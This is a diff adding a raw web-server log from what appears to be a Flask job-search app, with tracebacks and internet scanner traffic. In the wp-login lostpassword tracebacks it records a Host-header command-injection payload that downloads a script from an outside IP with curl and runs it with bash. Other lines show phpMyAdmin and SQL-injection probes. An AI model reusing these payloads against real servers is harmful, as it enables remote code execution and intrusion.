+47.203.93.185 - - [29/May/2017 22:00:35] code 400, message Bad request syntax ('\x05\x01\x00')
+47.203.93.185 - - [29/May/2017 22:00:35] "" 400 -
+47.203.93.185 - - [29/May/2017 22:00:46] code 400, message Bad request syntax ('\x05\x01\x00')
+47.203.93.185 - - [29/May/2017 22:00:46] "" 400 -
+38.107.180.172 - - [30/May/2017 02:26:19] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [30/May/2017 07:48:13] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+139.162.119.197 - - [30/May/2017 09:27:07] "GET / HTTP/1.1" 200 -
+66.228.44.30 - - [30/May/2017 09:43:07] "GET / HTTP/1.0" 200 -
+----------------------------------------
+Exception happened during processing of request from ('154.47.32.66', 63065)
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/SocketServer.py", line 596, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python2.7/SocketServer.py", line 331, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python2.7/SocketServer.py", line 652, in __init__
+    self.handle()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 228, in handle
+    rv = BaseHTTPRequestHandler.handle(self)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 340, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 259, in handle_one_request
+    self.raw_requestline = self.rfile.readline()
+IOError: [Errno 104] Connection reset by peer
+----------------------------------------
+122.114.50.38 - - [30/May/2017 15:51:48] "GET /phpmyadmin HTTP/1.1" 404 -
+179.218.124.24 - - [30/May/2017 17:24:21] "GET /hndUnblock.cgi HTTP/1.0" 404 -
+179.218.124.24 - - [30/May/2017 17:24:21] "GET /tmUnblock.cgi HTTP/1.0" 404 -
+104.156.251.7 - - [30/May/2017 18:04:34] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+104.156.251.7 - - [30/May/2017 18:04:34] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+104.156.251.7 - - [30/May/2017 18:04:34] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+104.156.251.7 - - [30/May/2017 18:04:34] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+104.156.251.7 - - [30/May/2017 18:04:34] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+104.156.251.7 - - [30/May/2017 18:04:34] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+222.186.31.153 - - [30/May/2017 21:34:20] "GET / HTTP/1.1" 200 -
+164.52.7.132 - - [30/May/2017 21:45:22] code 400, message Bad request syntax ('\x16\x03\x01\x01"\x01\x00\x01\x1e\x03\x03\x97\xa1\x97D\xa7\xf9\x10Xl\xd
+4j\xf2\x99\x91n\xc7cc\x8b\x1f\x07\xc6I:\x86\xd6\xae\xe9\xd9\x9cW\xba\x00\x00\x88\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0')
+164.52.7.132 - - [30/May/2017 21:45:22] ""ó°óDß˘Xlcã:Ü÷ÆúW∫à¿0¿,¿(¿$¿¿" 400 -
+----------------------------------------
+Exception happened during processing of request from ('164.52.7.132', 49160)
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/SocketServer.py", line 596, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python2.7/SocketServer.py", line 331, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python2.7/SocketServer.py", line 652, in __init__
+    self.handle()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 228, in handle
+    rv = BaseHTTPRequestHandler.handle(self)
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 340, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 259, in handle_one_request
+    self.raw_requestline = self.rfile.readline()
+IOError: [Errno 104] Connection reset by peer
+----------------------------------------
+141.212.122.96 - - [30/May/2017 22:48:04] "GET / HTTP/1.1" 200 -
+71.6.202.204 - - [30/May/2017 23:05:24] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [31/May/2017 01:58:41] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+209.126.136.5 - - [31/May/2017 02:22:03] "GET / HTTP/1.1" 200 -
+220.115.18.5 - - [31/May/2017 05:33:26] "GET /manager/html HTTP/1.1" 404 -
+90.176.97.189 - - [31/May/2017 06:00:25] "GET / HTTP/1.0" 200 -
+66.102.6.14 - - [31/May/2017 06:10:00] "GET / HTTP/1.1" 200 -
+66.102.6.14 - - [31/May/2017 06:10:00] "GET /favicon.ico HTTP/1.1" 200 -
+183.129.160.229 - - [31/May/2017 08:50:42] "GET / HTTP/1.1" 200 -
+103.237.145.12 - - [31/May/2017 09:27:54] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+103.237.145.12 - - [31/May/2017 09:27:55] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+103.237.145.12 - - [31/May/2017 09:27:56] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+103.237.145.12 - - [31/May/2017 09:27:57] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+103.237.145.12 - - [31/May/2017 09:27:57] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+103.237.145.12 - - [31/May/2017 09:27:58] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+222.186.31.153 - - [31/May/2017 10:30:48] "GET / HTTP/1.1" 200 -
+31.210.102.114 - - [31/May/2017 11:12:13] "GET / HTTP/1.0" 200 -
+60.191.38.77 - - [31/May/2017 14:15:07] "GET /current_config/Account1 HTTP/1.1" 404 -
+113.170.210.40 - - [31/May/2017 14:34:21] "GET / HTTP/1.0" 200 -
+113.170.210.40 - - [31/May/2017 14:34:21] "GET / HTTP/1.0" 200 -
+113.170.210.40 - - [31/May/2017 14:34:42] "GET / HTTP/1.0" 200 -
+113.170.210.40 - - [31/May/2017 14:34:53] "GET / HTTP/1.0" 200 -
+222.186.31.153 - - [31/May/2017 17:06:36] "GET / HTTP/1.1" 200 -
+180.97.106.161 - - [31/May/2017 17:55:51] "HEAD http://180.163.113.82/check_proxy HTTP/1.1" 404 -
+183.129.160.229 - - [31/May/2017 18:07:10] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [31/May/2017 18:15:25] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+176.193.173.40 - - [31/May/2017 22:33:30] "GET / HTTP/1.1" 200 -
+2.92.234.229 - - [31/May/2017 22:33:47] "GET / HTTP/1.1" 200 -
+90.155.151.22 - - [31/May/2017 22:33:54] "GET / HTTP/1.1" 200 -
+113.225.212.113 - - [31/May/2017 22:46:32] "GET / HTTP/1.1" 200 -
+217.61.15.213 - - [31/May/2017 23:56:24] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 -
+217.61.15.213 - - [31/May/2017 23:56:24] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 -
+217.61.15.213 - - [31/May/2017 23:56:24] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 -
+217.61.15.213 - - [31/May/2017 23:56:25] "GET /pma/scripts/setup.php HTTP/1.1" 404 -
+217.61.15.213 - - [31/May/2017 23:56:25] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 -
+217.61.15.213 - - [31/May/2017 23:56:26] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 -
+180.97.106.37 - - [01/Jun/2017 01:19:46] code 400, message Bad request syntax ('\x04\x01\x00P\xb4\xa3qR\x00')
+180.97.106.37 - - [01/Jun/2017 01:19:46] "P¥£qR" 400 -
+209.105.251.245 - - [01/Jun/2017 01:36:38] "POST //wp-login.php?action=lostpassword HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1994, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1985, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1540, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1590, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1576, in raise_routing_exception
+    raise FormDataRoutingRedirect(request)
+FormDataRoutingRedirect: A request was sent to this URL (http://target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{
+1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}-o${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_dir
+ectory}}rce${substr{10}{1}{$tod_log}}69.64.61.196${substr{0}{1}{$spool_directory}}rce.txt}} null)/?action=lostpassword) but a redirect was issued auto
+matically by the routing system to "http://target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}
+bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}-o${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{1
+0}{1}{$tod_log}}69.64.61.196${substr{0}{1}{$spool_directory}}rce.txt}} null)/?action=lostpassword".  Make sure to directly send your POST-request to t
+his URL since we can't make browsers or HTTP clients redirect with form data reliably or without user interaction.
+
+Note: this exception is only raised in debug mode
+209.105.251.245 - - [01/Jun/2017 01:36:38] "POST //wp-login.php?action=lostpassword HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1994, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1985, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1540, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1590, in dispatch_request
+    self.raise_routing_exception(req)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1576, in raise_routing_exception
+    raise FormDataRoutingRedirect(request)
+FormDataRoutingRedirect: A request was sent to this URL (http://target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{
+1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)/?action=lostpasswo
+rd) but a redirect was issued automatically by the routing system to "http://target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bi
+n${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)/?acti
+on=lostpassword".  Make sure to directly send your POST-request to this URL since we can't make browsers or HTTP clients redirect with form data relia
+bly or without user interaction.
+
+Note: this exception is only raised in debug mode
+209.105.251.245 - - [01/Jun/2017 01:36:38] "POST //wordpress/wp-login.php?action=lostpassword HTTP/1.1" 405 -
+209.105.251.245 - - [01/Jun/2017 01:36:39] "POST //wordpress/wp-login.php?action=lostpassword HTTP/1.1" 405 -
+209.105.251.245 - - [01/Jun/2017 01:36:39] "POST //wp/wp-login.php?action=lostpassword HTTP/1.1" 405 -
+209.105.251.245 - - [01/Jun/2017 01:36:39] "POST //wp/wp-login.php?action=lostpassword HTTP/1.1" 405 -
+180.97.106.161 - - [01/Jun/2017 03:50:23] code 400, message Bad request syntax ('\x05\x02\x00\x02')
+180.97.106.161 - - [01/Jun/2017 03:50:23] "" 400 -
+91.196.50.33 - - [01/Jun/2017 08:34:44] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+185.112.232.141 - - [01/Jun/2017 09:20:53] "GET / HTTP/1.1" 200 -
+183.129.160.229 - - [01/Jun/2017 09:39:26] "GET / HTTP/1.1" 200 -
+77.88.47.21 - - [01/Jun/2017 09:53:23] "GET /robots.txt HTTP/1.1" 404 -
+77.88.47.21 - - [01/Jun/2017 09:53:27] "GET / HTTP/1.1" 200 -
+125.166.122.132 - - [01/Jun/2017 10:11:14] "GET / HTTP/1.1" 200 -
+196.52.43.64 - - [01/Jun/2017 12:08:57] "GET / HTTP/1.0" 200 -
+177.124.74.3 - - [01/Jun/2017 12:34:46] "GET / HTTP/1.1" 200 -
+169.54.233.120 - - [01/Jun/2017 13:01:04] "GET / HTTP/1.1" 200 -
+169.54.233.120 - - [01/Jun/2017 13:03:54] "GET / HTTP/1.1" 200 -
+169.54.233.120 - - [01/Jun/2017 13:07:29] "GET / HTTP/1.1" 200 -
+173.208.160.34 - - [01/Jun/2017 17:40:14] "PROPFIND / HTTP/1.1" 405 -
+183.225.31.83 - - [01/Jun/2017 17:54:54] code 400, message Bad request version ('\xc0\x14\xc0')
+kCa@zÃ¥îaû|¿/¿+¿¿¿¿ [01/Ju¿¿" 400 -:54:54] "äÜSÁ≤õe"Gq®çí[e!ù
+183.225.31.83 - - [01/Jun/2017 17:54:54] "GET / HTTP/1.1" 200 -
+195.211.200.202 - - [01/Jun/2017 18:31:30] "GET / HTTP/1.1" 200 -
+183.129.160.229 - - [01/Jun/2017 20:02:11] "GET / HTTP/1.1" 200 -
+91.189.36.109 - - [01/Jun/2017 21:20:30] "GET /userlogin/login.aspx?id=1%27and%201=2 HTTP/1.1" 404 -
+91.196.50.33 - - [01/Jun/2017 23:48:56] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+106.75.81.67 - - [02/Jun/2017 00:12:32] "GET / HTTP/1.0" 200 -
+219.216.72.63 - - [02/Jun/2017 02:09:16] code 400, message Bad request syntax ('\x01I20100')
+219.216.72.63 - - [02/Jun/2017 02:09:16] "I20100" 400 -
+222.186.31.153 - - [02/Jun/2017 02:12:12] "GET / HTTP/1.1" 200 -
+62.210.148.214 - - [02/Jun/2017 03:24:29] "GET / HTTP/1.0" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET / HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /css/creative.min.css HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /js/creative.min.js HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /css/morphist.css HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /css/animate.min.css HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /js/morphist.min.js HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /img/header.jpg HTTP/1.1" 200 -
+52.23.200.200 - - [02/Jun/2017 03:56:43] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff?v=4.6.3 HTTP/1.1" 200 -
+183.129.160.229 - - [02/Jun/2017 04:48:37] "GET / HTTP/1.1" 200 -
+59.56.110.208 - - [02/Jun/2017 06:17:15] "GET /phpMyAdmin HTTP/1.1" 404 -
+59.56.110.208 - - [02/Jun/2017 06:18:03] "GET /phpMyAdmin HTTP/1.1" 404 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /search_jobs.html HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /css/creative.min.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /css/morphist.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /css/animate.min.css HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /js/pace.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:09] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /js/creative.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /js/app.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /js/morphist.min.js HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /img/header.jpg HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "POST /send_user_info HTTP/1.1" 200 -
+138.229.149.188 - - [02/Jun/2017 07:48:10] "GET /favicon.ico HTTP/1.1" 200 -
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/pyplot.py:523: RuntimeWarning: More than 20 fi
+gures have been opened. Figures created through the pyplot interface (`matplotlib.pyplot.figure`) are retained until explicitly closed and may consume
+ too much memory. (To control this warning, see the rcParam `figure.max_open_warning`).
+  max_open_warning, RuntimeWarning)
+img/data_science_scale_6_salary_dist.png
+138.229.149.188 - - [02/Jun/2017 07:48:29] "POST /get_job_stats HTTP/1.1" 200 -
+Error on request:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 205, in run_wsgi
+    execute(self.server.app)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 196, in execute
+    write(data)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 177, in write
+    self.wfile.write(data)
+IOError: [Errno 32] Broken pipe
+img/data_science_scale_6_salary_dist.png
+138.229.149.188 - - [02/Jun/2017 07:48:31] "POST /get_job_stats HTTP/1.1" 200 -
+Error on request:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 205, in run_wsgi
+    execute(self.server.app)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 196, in execute
+    write(data)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 177, in write
+    self.wfile.write(data)
+IOError: [Errno 32] Broken pipe
+139.162.108.53 - - [02/Jun/2017 09:50:41] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [02/Jun/2017 12:37:19] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+222.186.31.153 - - [02/Jun/2017 16:06:15] "GET / HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET / HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /css/creative.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /css/morphist.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /css/animate.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /js/creative.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /js/morphist.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /img/header.jpg HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:58] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:00:59] "GET /favicon.ico HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:00] "GET /search_jobs.html HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:00] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:00] "GET /js/pace.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:00] "GET /js/app.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:00] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:01] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+207.93.211.50 - - [02/Jun/2017 18:01:13] "POST /get_job_stats HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:14] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:14] "GET /img/data_science_scale_6_salary_dist.png?1496426473363 HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:15] "POST /send_user_info HTTP/1.1" 200 -
+207.93.211.50 - - [02/Jun/2017 18:01:47] "POST /filter_jobs HTTP/1.1" 200 -
+150.70.188.180 - - [02/Jun/2017 18:02:08] "GET / HTTP/1.1" 200 -
+191.96.249.136 - - [02/Jun/2017 18:29:14] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 -
+150.70.173.21 - - [02/Jun/2017 18:32:38] "GET / HTTP/1.1" 200 -
+79.106.45.59 - - [02/Jun/2017 19:40:19] "GET / HTTP/1.1" 200 -
+91.189.36.109 - - [02/Jun/2017 21:43:01] "GET /userlogin/login.aspix?id=1%27and%201=2 HTTP/1.1" 404 -
+183.129.160.229 - - [02/Jun/2017 21:54:38] "GET / HTTP/1.1" 200 -
+217.182.195.10 - - [03/Jun/2017 02:31:12] "GET / HTTP/1.1" 200 -
+217.182.195.10 - - [03/Jun/2017 02:31:13] "GET /robots.txt HTTP/1.1" 404 -
+91.196.50.33 - - [03/Jun/2017 03:08:18] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET / HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /css/creative.min.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /css/morphist.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /css/animate.min.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /js/creative.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:14] "GET /js/morphist.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:15] "GET /img/header.jpg HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:15] "GET /favicon.ico HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:26] "GET /search_jobs.html HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:26] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:26] "GET /js/pace.min.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:26] "GET /js/app.js HTTP/1.1" 200 -
+70.191.95.48 - - [03/Jun/2017 05:37:26] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$ python app/app.py
+system path
+['/home/ubuntu/dice_codingskills_project/app', '/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg', '/usr/l
+ocal/lib/python2.7/dist-packages/xgboost-0.6-py2.7.egg', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk'
+, '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ubuntu/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-pa
+ckages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pytho
+n2.7/dist-packages/wx-3.0-gtk2']
+/usr/lib/python2.7/dist-packages/gtk-2.0/gtk/__init__.py:57: GtkWarning: could not open display
+  warnings.warn(str(e), _gtk.Warning)
+/usr/local/lib/python2.7/dist-packages/IPython/html.py:14: ShimWarning: The `IPython.html` package has been deprecated. You should import from `notebo
+ok` instead. `IPython.html.widgets` has moved to `ipywidgets`.
+  "`IPython.html.widgets` has moved to `ipywidgets`.", ShimWarning)
+/usr/local/lib/python2.7/dist-packages/bokeh/util/deprecation.py:34: BokehDeprecationWarning: bokeh.properties was deprecated in Bokeh 0.11.0 and will
+ be removed, use bokeh.core.properties instead.
+  warn(message)
+ * Running on http://0.0.0.0:10001/ (Press CTRL+C to quit)
+ * Restarting with stat
+system path
+['/home/ubuntu/dice_codingskills_project/app', '/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg', '/usr/l
